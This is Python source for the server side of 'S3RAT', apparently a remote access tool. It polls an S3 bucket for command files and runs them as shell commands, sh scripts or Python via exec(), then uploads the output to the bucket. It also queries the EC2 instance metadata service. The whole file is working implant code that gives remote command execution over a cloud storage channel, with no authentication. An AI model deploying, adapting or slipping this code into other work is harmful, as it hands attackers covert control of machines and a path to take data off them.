import logging
import json
import sys
import io
import subprocess
from datetime import datetime, timezone  # Requires Python 3.2
from time import sleep
import urllib3

from . import get_result_name, S3Comm


log = logging.getLogger(__name__ if __name__ != '__main__' else 'server')


def get_instance_identity():
    http = urllib3.PoolManager()
    try:
        r = http.request('GET', 'http://169.254.169.254/latest/dynamic/instance-identity/document')
        # TODO: Verify using document signature
        return json.loads(r.data.decode('utf-8'))
    except urllib3.exceptions.HTTPError as e:
        log.error("HTTPError getting instance identity: %s", str(e))
        return {
            "error": str(e),
            "instanceId": "i-test123",
            "privateIp": "127.0.0.1"
        }


def execute_cmd(cmd_text):
    """ Execute a single command and return the result

    :param cmd_text: command text (str)
    :return: stdout and stderr combined text (str)
    """
    # subprocess.run requires python 3.5
    p = subprocess.run(cmd_text.split(' '), timeout=60, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return p.stdout.decode('utf-8')


def execute_script(script_text, prog='sh'):
    """ Execute a shell script and return the result

    :param script_text: script as text (str)
    :param prog: program to use as shell
    :return: stdout and stderr combined text (str)
    """
    # subprocess.run requires python 3.5
    p = subprocess.run(prog, input=script_text.encode('utf-8'), timeout=60,
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return p.stdout.decode('utf-8')


def execute_python(python_script):
    """ Execute a python script and return the result

    :param python_script: string to be executed as Python code
    :return: output generated by execution of Python code (str)
    """
    output = io.StringIO()
    sys.stdout = output
    exec(python_script)
    sys.stdout = sys.__stdout__
    return output.getvalue()


def cli_setup_parser(subparser):
    cli = subparser.add_parser('server', description="Run to check S3 for commands to execute")
    cli.add_argument('bucket', help="S3 Bucket name to use")
    cli.set_defaults(func=cli_main)


def cli_main(args):
    print("Starting S3RAT server...")
    comm = S3Comm(args.bucket)
    sid = comm.start_session()
    print("Session ID:", sid)
    sleep(10)
    comm.upload("0_server_ready.txt", "server is ready")
    while True:
        for new_name in comm.check():
            print("New Command:", new_name)
            obj_body = comm.download(new_name)
            result = None
            if new_name.endswith('cmd'):
                log.info("Execute Command: %s", new_name)
                result = execute_cmd(obj_body)
            elif new_name.endswith('sh'):
                log.info("Execute Script: %s", new_name)
                result = execute_script(obj_body)
            elif new_name.endswith('py'):
                log.info("Execute Python: %s", new_name)
                result = execute_python(obj_body)
            else:
                log.error("Unknown File Type: %s", new_name)
            comm.remember(new_name)
            if result:
                print("Completed:", new_name)
                result_name = get_result_name(new_name)
                comm.upload(result_name, result)
        print(datetime.now(timezone.utc).strftime("%H%M%SZ"), "Sleeping...")
        sleep(5)
